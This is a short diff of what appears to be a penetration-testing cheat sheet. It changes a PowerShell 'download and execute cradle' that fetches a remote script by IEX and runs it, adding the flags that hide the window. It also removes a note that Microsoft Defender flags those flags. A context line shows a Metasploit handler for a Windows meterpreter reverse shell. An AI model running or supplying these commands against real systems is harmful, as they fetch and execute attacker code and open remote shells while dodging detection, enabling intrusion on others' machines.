@@ -102,9 +102,8 @@ sudo msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/re
 ```
 
 #### Download and execute cradle PowerShell:
-- For some reason it gets flagged by defender with ```-nop``` and ```-hidden```
 ```
-powershell.exe IEX (New-Object System.Net.WebClient).downloadString('http://192.168.178.113:8080/runme.ps1')
+powershell.exe -nop -w hidden -C "IEX (New-Object System.Net.WebClient).downloadString('http://<IP>/runme.ps1')"
 ```
 
 ## HTA files
